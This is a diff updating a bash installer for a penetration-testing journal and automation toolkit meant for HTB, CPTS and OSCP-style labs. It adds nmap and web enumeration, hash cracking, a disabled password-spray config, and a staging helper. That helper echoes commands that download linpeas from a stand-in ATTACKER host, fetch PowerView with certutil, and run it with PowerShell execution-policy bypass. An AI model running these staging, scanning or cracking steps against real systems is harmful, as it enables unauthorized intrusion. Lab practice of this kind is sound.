@@ -1,10 +1,13 @@
 #!/usr/bin/env bash
-# htb_oscp_cpts_journal_aio.sh (reviewed/fixed)
-# Fixes:
-# - heredoc delimiter collisions (critical)
-# - port matching false positives (80 vs 8080, etc)
-# - ffuf -e extensions formatting
-# - safer bin script updates (backup + overwrite)
+# htb_oscp_cpts_journal_aio.sh (UPDATED / FIXED)
+# Purpose: Modular, self-healing pentest journal + automation tuned for HTB + CPTS + OSCP-style labs.
+#
+# Fixes vs your current version:
+# - ✅ No heredoc delimiter collisions (prevents truncated makebox/enum scripts)
+# - ✅ enum uses $(ts) (no "ts: unbound variable" with set -u)
+# - ✅ Robust port checks (80 won't match 8080)
+# - ✅ ffuf -e uses proper format (".php,.txt,..." not ".php,txt")
+# - ✅ Safe overwrites of bin helpers by default (backs up old scripts)
 
 set -euo pipefail
 
@@ -15,7 +18,7 @@ BIN="${ROOT}/bin"
 CFG="${ROOT}/config"
 WLISTS="${ROOT}/wordlists"
 
-# Overwrite bin helpers by default (prevents stale broken helpers after partial installs)
+# Overwrite bin helpers by default (prevents stale/broken helpers after partial installs)
 FORCE_BIN="${FORCE_BIN:-1}"
 
 umask 022
@@ -24,8 +27,7 @@ say()  { printf "\033[1;32m[+]\033[0m %s\n" "$*"; }
 warn() { printf "\033[1;33m[!]\033[0m %s\n" "$*"; }
 die()  { printf "\033[1;31m[x]\033[0m %s\n" "$*"; exit 1; }
 
-have() { command -v "$1" >/dev/null 2>&1; }
-ensure_dir() { mkdir -p "$1"; }
+ensure_dir() { mkdir -p "$@"; }
 
 backup_if_exists() {
   local f="$1"
@@ -50,7 +52,6 @@ should_write_bin() {
   [[ ! -f "$f" ]]
 }
 
-# --- Folders (self-healing) ---
 say "Creating folders under ${ROOT}"
 ensure_dir "${TEMPLATE}" "${BOXES}" "${BIN}" "${CFG}" "${WLISTS}"
 
@@ -62,14 +63,16 @@ for d in \
   ensure_dir "${TEMPLATE}/${d}"
 done
 
-# --- Default config ---
-# NOTE: Only creates if missing. If you already have it, edit it manually.
+# --------------------------
+# Default config (create-only)
+# --------------------------
 if [[ ! -f "${CFG}/default.conf" ]]; then
   say "Writing ${CFG}/default.conf"
   cat > "${CFG}/default.conf" <<'DEFAULTCONF'
 # default.conf (HTB/CPTS/OSCP tuned)
 
 # ---- Scanning ----
+# FAST: good initial coverage. FULL is optional (--full)
 NMAP_FAST_PORTS="21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,465,587,593,636,993,995,1433,1521,2049,3306,3389,5432,5985,5986,6379,8000,8080,8443,9000,9090,9200,27017"
 NMAP_TIMING="-T4"
 NMAP_EXTRA_ARGS="-Pn"
@@ -77,16 +80,16 @@ NMAP_FAST_MINRATE="1500"
 NMAP_FULL_MINRATE="2000"
 
 NMAP_DEFAULT_SCRIPTS="-sC -sV"
-NMAP_SAFE_SCRIPTS="--script safe"
 NMAP_VULN_SCRIPTS="--script vuln"
 
+# UDP (optional, light)
 UDP_TOP_PORTS="53,67,68,69,123,161,162,500,514,1900,5353"
 RUN_UDP="0"
 
 # ---- Web enum ----
 RUN_FFUF="1"
 FFUF_WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
-# ffuf expects comma-separated extensions with leading dots
+# ffuf expects comma-separated extensions with leading dots:
 FFUF_EXT=".php,.asp,.aspx,.jsp,.txt,.html,.js,.json,.xml,.bak,.old,.zip,.tar,.tar.gz"
 FFUF_TIMEOUT="120"
 
@@ -124,19 +127,22 @@ CRACK_TOOL="john"   # john | hashcat
 DEFAULTCONF
 fi
 
-# --- Template files (create-only; do not overwrite) ---
+# --------------------------
+# Template docs (create-only)
+# --------------------------
 if [[ ! -f "${TEMPLATE}/00_admin/README.md" ]]; then
   cat > "${TEMPLATE}/00_admin/README.md" <<'ADMINREADME'
 # Admin (HTB / CPTS / OSCP tuned)
 
-## Scope / LOE
-- Subnet/Targets:
-- Constraints:
-- Notes (reverts/resets, flaky services):
-
 ## Workflow
 - FAST scan → targeted scan → optional FULL -p-
 - Evidence-first: commands + outputs + screenshots
+- Service-driven enum: SMB/LDAP/Kerb/Web/SNMP/NFS/etc
+
+## Checklist
+- [ ] makebox <Name> <IP|SUBNET>
+- [ ] enum --box <Name> [--full] [--vuln] [--udp]
+- [ ] Update loot.md continuously
 ADMINREADME
 fi
 
@@ -211,10 +217,15 @@ curl -fsSL http://ATTACKER:8001/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/l
 LINSTAGE
 fi
 
-# --- Wordlists layout ---
+# --------------------------
+# Wordlists layout
+# --------------------------
+say "Ensuring wordlists layout"
 ensure_dir "${WLISTS}/passwords" "${WLISTS}/users" "${WLISTS}/rules" "${WLISTS}/custom"
 
-# --- mkcombo ---
+# --------------------------
+# mkcombo
+# --------------------------
 if should_write_bin "${BIN}/mkcombo"; then
   say "Writing ${BIN}/mkcombo"
   backup_if_exists "${BIN}/mkcombo"
@@ -254,7 +265,9 @@ MKCOMBO
   chmod +x "${BIN}/mkcombo"
 fi
 
-# --- sync_wordlists ---
+# --------------------------
+# sync_wordlists
+# --------------------------
 if should_write_bin "${BIN}/sync_wordlists"; then
   say "Writing ${BIN}/sync_wordlists"
   backup_if_exists "${BIN}/sync_wordlists"
@@ -311,7 +324,9 @@ SYNCW
   chmod +x "${BIN}/sync_wordlists"
 fi
 
-# --- crack helper ---
+# --------------------------
+# crack helper
+# --------------------------
 if should_write_bin "${BIN}/crack"; then
   say "Writing ${BIN}/crack"
   backup_if_exists "${BIN}/crack"
@@ -323,7 +338,7 @@ usage() {
   cat <<'USAGE'
 Usage:
   crack --tool john --hashfile <file> --wordlist <wl>
-  crack --tool hashcat --mode <id> --hashfile <file> --wordlist <wl> [--rules <rulesfile>
+  crack --tool hashcat --mode <id> --hashfile <file> --wordlist <wl> [--rules <rulesfile>]
 USAGE
 }
 
@@ -365,7 +380,9 @@ CRACK
   chmod +x "${BIN}/crack"
 fi
 
-# --- stage helper ---
+# --------------------------
+# stage helper
+# --------------------------
 if should_write_bin "${BIN}/stage"; then
   say "Writing ${BIN}/stage"
   backup_if_exists "${BIN}/stage"
@@ -402,6 +419,7 @@ mkdir -p "$PSDIR" "$LINDIR"
 echo "[+] PS staging:   $PSDIR"
 echo "    Serve: cd \"$PSDIR\" && python3 -m http.server $PSPORT"
 echo "    certutil -urlcache -split -f http://${ATT}:${PSPORT}/PowerView.ps1 C:\\Windows\\Temp\\PowerView.ps1"
+echo "    powershell -ep bypass -f C:\\Windows\\Temp\\PowerView.ps1"
 echo
 echo "[+] Linux staging: $LINDIR"
 echo "    Serve: cd \"$LINDIR\" && python3 -m http.server $LINPORT"
@@ -410,7 +428,9 @@ STAGE
   chmod +x "${BIN}/stage"
 fi
 
-# --- makebox (CRITICAL: unique delimiters to avoid installer heredoc collision) ---
+# --------------------------
+# makebox (NO heredoc collisions)
+# --------------------------
 if should_write_bin "${BIN}/makebox"; then
   say "Writing ${BIN}/makebox"
   backup_if_exists "${BIN}/makebox"
@@ -428,7 +448,6 @@ Usage:
   makebox <Name> <target_ip_or_subnet> [domain] [dc_ip]
 USAGE
 }
-
 [[ $# -lt 2 ]] && usage && exit 1
 
 BOX="$1"
@@ -463,13 +482,13 @@ DOMAIN="__DOMAIN__"
 DC_IP="__DCIP__"
 DNS_IP="__DCIP__"
 
+# Spray disabled by default
 ENABLE_SPRAY="0"
 SPRAY_USERS_FILE="__DEST__/04_ad/users.txt"
 SPRAY_PASSWORDS_FILE="__ROOT__/wordlists/passwords/seasons_months_short.txt"
 SPRAY_SUBNET="__TARGET__"
 BOXCONF_EOF
 
-  # substitute placeholders safely
   sed -i "s|__TARGET__|${TARGET}|g" "${BOXCONF}"
   sed -i "s|__DOMAIN__|${DOMAIN}|g" "${BOXCONF}"
   sed -i "s|__DCIP__|${DC_IP}|g" "${BOXCONF}"
@@ -490,7 +509,9 @@ MAKEBOX_SCRIPT
   chmod +x "${BIN}/makebox"
 fi
 
-# --- enum (fix port matching + ffuf ext) ---
+# --------------------------
+# enum (FIXED: $(ts), robust port matching, ffuf -e)
+# --------------------------
 if should_write_bin "${BIN}/enum"; then
   say "Writing ${BIN}/enum"
   backup_if_exists "${BIN}/enum"
@@ -534,18 +555,20 @@ done
 BOXDIR="${ROOT}/boxes/${BOX}"
 [[ ! -d "${BOXDIR}" ]] && { warn "Box dir not found: ${BOXDIR}. Run: makebox ${BOX} <target>"; exit 1; }
 
+# Load defaults then box.conf
 # shellcheck disable=SC1090
 source "${CFG_DEFAULT}"
 [[ -f "${BOXDIR}/box.conf" ]] && source "${BOXDIR}/box.conf" # shellcheck disable=SC1090
 
+# CLI overrides
 [[ -n "${TARGET}" ]] && TARGET="${TARGET}"
 [[ -n "${DOMAIN}" ]] && DOMAIN="${DOMAIN}"
 [[ -n "${DC_IP}" ]] && DC_IP="${DC_IP}" && DNS_IP="${DC_IP}"
 
 [[ -z "${TARGET:-}" ]] && { warn "No target set. Provide --target or set TARGET in ${BOXDIR}/box.conf"; exit 1; }
 
-RUNLOG="${BOXDIR}/07_notes/enum_runs.log"
 mkdir -p "${BOXDIR}/07_notes"
+RUNLOG="${BOXDIR}/07_notes/enum_runs.log"
 touch "${RUNLOG}"
 echo "=== Run $(ts) target=${TARGET} full=${DO_FULL} vuln=${DO_VULN} udp=${DO_UDP} domain=${DOMAIN:-} dc=${DC_IP:-} ===" >> "${RUNLOG}"
 
@@ -561,7 +584,7 @@ scan_host() {
   mkdir -p "${hostdir}"/{scans,enum,web,ad,loot,notes}
 
   say "FAST scan ${ip} (ports: ${NMAP_FAST_PORTS})"
-  local fastbase="${hostdir}/scans/${ip}_fast_${ts}"
+  local fastbase="${hostdir}/scans/${ip}_fast_$(ts)"
   nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} --min-rate "${NMAP_FAST_MINRATE:-1500}" \
     -p "${NMAP_FAST_PORTS}" --open ${NMAP_DEFAULT_SCRIPTS:-} "${ip}" -oA "${fastbase}" >/dev/null 2>&1 || true
 
@@ -572,7 +595,7 @@ scan_host() {
   local full_ports=""
   if [[ "${DO_FULL}" == "1" ]]; then
     say "FULL scan ${ip} (-p-)"
-    local fullbase="${hostdir}/scans/${ip}_full_${ts}"
+    local fullbase="${hostdir}/scans/${ip}_full_$(ts)"
     nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} --min-rate "${NMAP_FULL_MINRATE:-2000}" \
       -p- --open -sS "${ip}" -oA "${fullbase}" >/dev/null 2>&1 || true
     full_ports="$(parse_ports_from_gnmap "${fullbase}.gnmap")"
@@ -590,18 +613,18 @@ scan_host() {
   fi
 
   say "TARGETED service scan ${ip} (ports: ${merged_ports})"
-  local servbase="${hostdir}/scans/${ip}_services_${ts}"
+  local servbase="${hostdir}/scans/${ip}_services_$(ts)"
   nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${merged_ports}" -sC -sV "${ip}" -oA "${servbase}" >/dev/null 2>&1 || true
 
   if [[ "${DO_VULN}" == "1" ]]; then
     say "VULN scripts ${ip} (timeboxed)"
-    local vulnbase="${hostdir}/scans/${ip}_vuln_${ts}"
+    local vulnbase="${hostdir}/scans/${ip}_vuln_$(ts)"
     timeout 300 nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${merged_ports}" ${NMAP_VULN_SCRIPTS:-} "${ip}" -oA "${vulnbase}" >/dev/null 2>&1 || true
   fi
 
   if [[ "${DO_UDP}" == "1" || "${RUN_UDP:-0}" == "1" ]]; then
     say "UDP light scan ${ip} (ports: ${UDP_TOP_PORTS})"
-    local udpbase="${hostdir}/scans/${ip}_udp_${ts}"
+    local udpbase="${hostdir}/scans/${ip}_udp_$(ts)"
     timeout 300 nmap -sU ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${UDP_TOP_PORTS}" --open "${ip}" -oA "${udpbase}" >/dev/null 2>&1 || true
   fi
 
@@ -632,7 +655,7 @@ scan_host() {
       curl -ksL "${url}/" -m 12 > "${hostdir}/web/home_${p}.html" 2>/dev/null || true
       have whatweb && whatweb "${url}" > "${hostdir}/web/whatweb_${p}.txt" 2>&1 || true
 
-      # ffuf wordlist fallback if seclists path missing
+      # wordlist fallback if seclists missing
       local wl="${FFUF_WORDLIST}"
       [[ -f "$wl" ]] || wl="/usr/share/wordlists/dirb/common.txt"
 
@@ -642,6 +665,9 @@ scan_host() {
       elif [[ "${RUN_FEROX:-0}" == "1" ]] && have feroxbuster; then
         timeout "${FFUF_TIMEOUT:-120}" feroxbuster -u "${url}" ${FEROX_OPTS:-} \
           > "${hostdir}/web/ferox_${p}.txt" 2>&1 || true
+      elif [[ "${RUN_GOBUSTER:-0}" == "1" ]] && have gobuster; then
+        timeout "${GOBUSTER_TIMEOUT:-120}" gobuster dir -u "${url}" -w "${GOBUSTER_WORDLIST}" -x "${GOBUSTER_EXT}" -q \
+          > "${hostdir}/web/gobuster_${p}.txt" 2>&1 || true
       fi
 
       if [[ "${RUN_WPSCAN:-0}" == "1" ]] && have wpscan; then
@@ -653,9 +679,11 @@ scan_host() {
   done
 }
 
+# Subnet mode
 if [[ "${TARGET}" == */* ]]; then
   say "Subnet mode discovery: ${TARGET}"
   disc="${BOXDIR}/01_scans/discovery_$(ts)"
+  mkdir -p "${BOXDIR}/01_scans"
   nmap -sn "${TARGET}" -oA "${disc}" >/dev/null 2>&1 || true
 
   ips=()
@@ -676,12 +704,16 @@ else
   scan_host "${TARGET}"
 fi
 
-say "Done. Review: ${BOXDIR}/hosts/<ip>/*"
+say "Done. Review:"
+say "  ${BOXDIR}/07_notes/enum_runs.log"
+say "  ${BOXDIR}/hosts/<ip>/{scans,enum,web,ad,loot}"
 ENUM_SCRIPT
   chmod +x "${BIN}/enum"
 fi
 
-# --- PATH + aliases ---
+# --------------------------
+# PATH + aliases
+# --------------------------
 SNIP="${ROOT}/.shellrc_snippet"
 cat > "${SNIP}" <<EOF
 # pentest-journal helpers (HTB/CPTS/OSCP tuned)
@@ -700,6 +732,6 @@ append_if_missing "${BASHRC}" "# pentest-journal helpers (HTB/CPTS/OSCP tuned)" 
 say "Installed."
 say "Next steps:"
 echo "  source ~/.bashrc"
-echo "  makebox Resolute 10.129.96.155"
-echo "  enum --box Resolute --full"
+echo "  makebox resolute 10.129.96.155"
+echo "  enum --box resolute --full"
 warn "Bin helpers overwrite is ON by default (FORCE_BIN=1). Set FORCE_BIN=0 to preserve existing."
